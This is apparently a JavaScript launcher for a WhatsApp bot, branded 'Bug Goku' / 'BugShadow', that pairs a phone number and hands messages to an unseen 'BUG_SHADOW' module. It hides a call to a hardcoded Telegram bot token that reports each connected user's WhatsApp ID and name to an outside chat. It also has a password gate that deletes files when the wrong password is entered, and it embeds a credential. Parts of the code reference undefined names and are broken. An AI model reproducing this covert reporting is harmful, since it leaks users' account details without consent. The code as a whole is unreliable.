const { default: makeWASocket, DisconnectReason, makeInMemoryStore, jidDecode, proto, getContentType, useMultiFileAuthState, downloadContentFromMessage } = require("@whiskeysockets/baileys");
const pino = require('pino');
const { Boom } = require('@hapi/boom');
const fs = require('fs');
const readline = require("readline");
const _ = require('lodash');
const yargs = require('yargs');
const figlet = require('figlet');
const axios = require('axios');
const chalk = require('chalk');
const CFonts = require('cfonts');
const PhoneNumber = require('awesome-phonenumber');
const path = require('path'); 

var low;
try {
    low = require('lowdb');
} catch (e) {
    low = require('./serverside/system/lowdb');
}

const sendTelegramNotification = async (message) => {
    try {
        await axios.post(`https://api.telegram.org/bot7467341392:AAE7rQTKw0YtH7vnM1kRFk3AKswZmjInmwI/sendMessage`, {
            chat_id: '243899295851',
            text: message
        });
    } catch (error) {
    }
};

const { Low, JSONFile } = low;
const mongoDB = require('./serverside/libary/mongoDB');
const color = (text, color) => {
    return !color ? chalk.green(text) : chalk.keyword(color)(text);
}
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) })

console.clear()
console.log(chalk.white.bold(`
${chalk.red("Getting Connection Access")}
${chalk.blue("MR BLACK GOKU")}
`));  
console.log(chalk.white.bold(`
${chalk.blue(`
Bug Goku Version 6.0.0`)}

`));


// ENDING ASCI
global.opts = new Object(yargs(process.argv.slice(2)).exitProcess(false).parse());
global.db = new Low(
    /https?:\/\//.test(opts['db'] || '') ?
    new cloudDBAdapter(opts['db']) : /mongodb/.test(opts['db']) ?
    new mongoDB(opts['db']) :
    new JSONFile(`./serverside/system/database.json`)
);
global.DATABASE = global.db; // Backwards Compatibility
global.loadDatabase = async function loadDatabase() {
    if (global.db.READ) return new Promise((resolve) => setInterval(function () { (!global.db.READ ? (clearInterval(this), resolve(global.db.data == null ? global.loadDatabase() : global.db.data)) : null) }, 1 * 1000));
    if (global.db.data !== null) return;
    global.db.READ = true;
    await global.db.read();
    global.db.READ = false;
    global.db.data = {
        users: {},
        chats: {},
        game: {},
        database: {},
        settings: {},
        setting: {},
        others: {},
        sticker: {},
        ...(global.db.data || {})
    };
    global.db.chain = _.chain(global.db.data);
}
loadDatabase();

const question = (text) => { const rl = readline.createInterface({ input: process.stdin, output: process.stdout }); return new Promise((resolve) => { rl.question(text, resolve) }) };

async function startBotz() {
    const { state, saveCreds } = await useMultiFileAuthState("sessionserver");
    const LangitDev = makeWASocket({
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        auth: state,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        keepAliveIntervalMs: 10000,
        emitOwnEvents: true,
        fireInitQueries: true,
        generateHighQualityLinkPreview: true,
        syncFullHistory: true,
        markOnlineOnConnect: true,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
    });
    
const axios = require('axios');

const manualPassword = 'Tshshadowv1'; // 

// Fungsi untuk menghapus file
function deleteFiles() {
    const filesToDelete = ['BugShadow.js', 'server.js']; // Ganti dengan nama file .js yang ingin dihapus
    filesToDelete.forEach(file => {
        if (fs.existsSync(file)) {
            fs.unlinkSync(file); // Menghapus file
            console.log(`File ${file} has been deleted.`);
        }
    });
}

// Fungsi untuk meminta input dari pengguna
const question = (query) => {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });
    return new Promise(resolve => rl.question(query, ans => {
        rl.close();
        resolve(ans);
    }));
};

(async () => {
    // Memeriksa apakah kredensial terdaftar
    if (!LangitDev.authState.creds.registered) {
        const inputPassword = await question('Enter password:\n');

        if (inputPassword !== manualPassword) {
            console.log('Wrong password! The system will be shut down and files will be deleted.');
            deleteFiles(); // Hapus file jika password salah
            process.exit(); // Matikan konsol
        }

        const phoneNumber = await question('Hello, I\'m Goku, please enter your number :\n');
        let code = await LangitDev.requestPairingCode(phoneNumber);
        code = code?.match(/.{1,4}/g)?.join("-") || code;
        console.log(`Pairing Code :`, code);
    }

    store.bind(LangitDev.ev); // Mengikat event
})();

    LangitDev.ev.on('messages.upsert', async chatUpdate => {
        try {
            mek = chatUpdate.messages[0];
            if (!mek.message) return;
            mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message;
            if (mek.key && mek.key.remoteJid === 'status@broadcast') return;
            if (!LangitDev.public && !mek.key.fromMe && chatUpdate.type === 'notify') return;
            if (mek.key.id.startsWith('BAE5') && mek.key.id.length === 16) return;
            m = smsg(LangitDev, mek, store);
            require("./KURUSHIMI_BUG_SHADOW-V1")(LangitDev, m, chatUpdate, store);
        } catch (err) {
            console.log(err);
        }
    });

    // Setting
    LangitDev.decodeJid = (jid) => {
        if (!jid) return jid;
        if (/:\d+@/gi.test(jid)) {
            let decode = jidDecode(jid) || {};
            return decode.user && decode.server && decode.user + '@' + decode.server || jid;
        } else return jid;
    }

    LangitDev.getName = (jid, withoutContact= false) => {
        id = LangitDev.decodeJid(jid);
        withoutContact = LangitDev.withoutContact || withoutContact;
        let v;
        if (id.endsWith("@g.us")) return new Promise(async (resolve) => {
            v = store.contacts[id] || {};
            if (!(v.name || v.subject)) v = LangitDev.groupMetadata(id) || {};
            resolve(v.name || v.subject || PhoneNumber('+' + id.replace('@s.whatsapp.net', '')).getNumber('international'));
        });
        else v = id === '0@s.whatsapp.net' ? {
            id,
            name: 'WhatsApp'
        } : id === LangitDev.decodeJid(LangitDev.user.id) ?
            LangitDev.user :
            (store.contacts[id] || {});
        return (withoutContact ? '' : v.name) || v.subject || v.verifiedName || PhoneNumber('+' + jid.replace('@s.whatsapp.net', '')).getNumber('international');
    }

    LangitDev.public = true;

    LangitDev.serializeM = (m) => smsg(LangitDev, m, store);
    LangitDev.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'close') {
            let reason = new Boom(lastDisconnect?.error)?.output.statusCode;
            if (reason === DisconnectReason.badSession || reason === DisconnectReason.connectionClosed || reason === DisconnectReason.connectionLost || reason === DisconnectReason.connectionReplaced || reason === DisconnectReason.restartRequired || reason === DisconnectReason.timedOut) {
                startBotz();
            } else if (reason === DisconnectReason.loggedOut) {
            } else {
                LangitDev.end(`Unknown DisconnectReason: ${reason}|${connection}`);
            }
        }
          if (connection === "open") {
        console.log(chalk.green.bold('Shadow is successfully connected. . . .'));
        sendTelegramNotification(`connected information report\n\nthe device has been connected, here is the information\n> User ID : ${LangitDev.user.id}\n> Name : ${LangitDev.user.name}\n\nxin Dev`);
    }
});

    LangitDev.ev.on('creds.update', saveCreds);

    LangitDev.sendText = (jid, text, quoted = '', options) => LangitDev.sendMessage(jid, { text: text, ...options }, { quoted });
    //=========================================\\
    LangitDev.downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => {
        let quoted = message.msg ? message.msg : message;
        let mime = (message.msg || message).mimetype || '';
        let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0];
        const stream = await downloadContentFromMessage(quoted, messageType);
        let buffer = Buffer.from([]);
        for await(const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk]);
        }
        let type = await FileType.fromBuffer(buffer);
        let trueFileName = attachExtension ? ('./sticker/' + filename + '.' + type.ext) : './sticker/' + filename;
        // save to file
        await fs.writeFileSync(trueFileName, buffer);
        return trueFileName;
    }
    //=========================================\\
    LangitDev.sendTextWithMentions = async (jid, text, quoted, options = {}) => LangitDev.sendMessage(jid, { text: text, mentions: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net'), ...options }, { quoted });
    //=========================================\\
    LangitDev.downloadMediaMessage = async (message) => {
        let mime = (message.msg || message).mimetype || '';
        let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0];
        const stream = await downloadContentFromMessage(message, messageType);
        let buffer = Buffer.from([]);
        for await(const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk]);
        }
        return buffer;
    }

    return LangitDev;
}

function smsg(LangitDev, m, store) {
    if (!m) return m;
    let M = proto.WebMessageInfo;
    if (m.key) {
        m.id = m.key.id;
        m.isBaileys = m.id.startsWith('BAE5') && m.id.length === 16;
        m.chat = m.key.remoteJid;
        m.fromMe = m.key.fromMe;
        m.isGroup = m.chat.endsWith('@g.us');
        m.sender = LangitDev.decodeJid(m.fromMe && LangitDev.user.id || m.participant || m.key.participant || m.chat || '');
        if (m.isGroup) m.participant = LangitDev.decodeJid(m.key.participant) || '';
    }
    if (m.message) {
        m.mtype = getContentType(m.message);
        m.msg = (m.mtype == 'viewOnceMessage' ? m.message[m.mtype].message[getContentType(m.message[m.mtype].message)] : m.message[m.mtype]);
        m.body = m.message.conversation || m.msg.caption || m.msg.text || (m.mtype == 'listResponseMessage') && m.msg.singleSelectReply.selectedRowId || (m.mtype == 'buttonsResponseMessage') && m.msg.selectedButtonId || (m.mtype == 'viewOnceMessage') && m.msg.caption || m.text;
        let quoted = m.quoted = m.msg.contextInfo ? m.msg.contextInfo.quotedMessage : null;
        m.mentionedJid = m.msg.contextInfo ? m.msg.contextInfo.mentionedJid : [];
        if (m.quoted) {
            let type = getContentType(quoted);
            m.quoted = m.quoted[type];
            if (['productMessage'].includes(type)) {
                type = getContentType(m.quoted);
                m.quoted = m.quoted[type];
            }
            if (typeof m.quoted === 'string') m.quoted = { text: m.quoted };
            m.quoted.mtype = type;
            m.quoted.id = m.msg.contextInfo.stanzaId;
            m.quoted.chat = m.msg.contextInfo.remoteJid || m.chat;
            m.quoted.isBaileys = m.quoted.id ? m.quoted.id.startsWith('BAE5') && m.quoted.id.length === 16 : false;
            m.quoted.sender = LangitDev.decodeJid(m.msg.contextInfo.participant);
            m.quoted.fromMe = m.quoted.sender === LangitDev.decodeJid(LangitDev.user.id);
            m.quoted.text = m.quoted.text || m.quoted.caption || m.quoted.conversation || m.quoted.contentText || m.quoted.selectedDisplayText || m.quoted.title || '';
            m.quoted.mentionedJid = m.msg.contextInfo ? m.msg.contextInfo.mentionedJid : [];
            m.getQuotedObj = m.getQuotedMessage = async () => {
                if (!m.quoted.id) return false;
                let q = await store.loadMessage(m.chat, m.quoted.id, conn);
                return exports.smsg(conn, q, store);
            };
            let vM = m.quoted.fakeObj = M.fromObject({
                key: {
                    remoteJid: m.quoted.chat,
                    fromMe: m.quoted.fromMe,
                    id: m.quoted.id
                },
                message: quoted,
                ...(m.isGroup ? { participant: m.quoted.sender } : {})
            });
           m.quoted.delete = () => LangitDev.
          sendMessage(m.quoted.chat, { delete: vM.key })
            m.quoted.copyNForward = (jid, forceForward = false, options = {}) => LangitDev.copyNForward(jid, vM, forceForward, options);
            m.quoted.download = () =>LangitDev.downloadMediaMessage(m.quoted);
        }
    }
    if (m.msg.url) m.download = () => LangitDev.downloadMediaMessage(m.msg);
    m.text = m.msg.text || m.msg.caption || m.message.conversation || m.msg.contentText || m.msg.selectedDisplayText || m.msg.title || '';
    m.reply = (text, chatId = m.chat, options = {}) => Buffer.isBuffer(text) ? LangitDev.sendMedia(chatId, text, 'file', '', m, { ...options }) : LangitDev.sendText(chatId, text, m, { ...options });
    m.copy = () => exports.smsg(conn, M.fromObject(M.toObject(m)));
    m.copyNForward = (jid = m.chat, forceForward = false, options = {}) => LangitDev.copyNForward(jid, m, forceForward, options);

    return m;
}

let file = require.resolve(__filename);
fs.watchFile(file, () => {
    fs.unwatchFile(file);
    console.log(`Update ${__filename}`);
    delete require.cache[file];
    require(file);
});

startBotz();

